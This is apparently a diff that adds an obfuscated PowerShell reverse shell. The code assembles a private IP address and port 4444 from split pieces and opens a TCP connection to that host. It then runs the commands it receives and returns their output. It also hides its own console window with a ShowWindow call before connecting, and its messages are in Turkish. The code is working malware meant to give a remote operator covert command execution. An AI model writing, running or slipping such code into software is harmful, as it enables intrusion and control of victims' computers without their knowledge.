@@ -1,0 +1,51 @@
+    }
+    catch {
+        return "Islem basarisiz.`n" + (Y2K)
+    }
+    if ([string]::IsNullOrEmpty($r7t)) {
+        $r7t = "Komut calisti.`n"
+    }
+    return $r7t + (Y2K)
+}
+
+function Q8P {
+    $a1b = "172."
+    $b2c = "22."
+    $c3d = "164."
+    $d4e = "211"
+    $p5f = 44
+    $p6g = 44
+    $i7h = $a1b + $b2c + $c3d + $d4e
+    $p8i = $p5f * 100 + $p6g
+    try {
+        $k9j = New-Object System.Net.Sockets.TcpClient($i7h, $p8i)
+    }
+    catch {
+        Z3M "Baglanti basarisiz."
+    }
+    $s1k = $k9j.GetStream()
+    $m2n = Y2K
+    $b3y = [System.Text.Encoding]::ASCII.GetBytes($m2n)
+    $s1k.Write($b3y, 0, $b3y.Length)
+    $f4z = New-Object byte[] 4096
+    while ($true) {
+        try {
+            $r5x = $s1k.Read($f4z, 0, 4096)
+            if ($r5x -le 0) { break }
+            $c6w = [System.Text.Encoding]::ASCII.GetString($f4z, 0, $r5x).Trim()
+            $r7v = W4N -c5v $c6w
+            $b8u = [System.Text.Encoding]::ASCII.GetBytes($r7v)
+            $s1k.Write($b8u, 0, $b8u.Length)
+        }
+        catch {
+            break
+        }
+    }
+    $k9j.Close()
+}
+
+Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int s);' -Name X9Y -Namespace Z8W
+$h1q = (Get-Process -id $pid).MainWindowHandle
+[Z8W.X9Y]::ShowWindow($h1q, 0) | Out-Null
+Start-Sleep -Milliseconds 1000
+Q8P
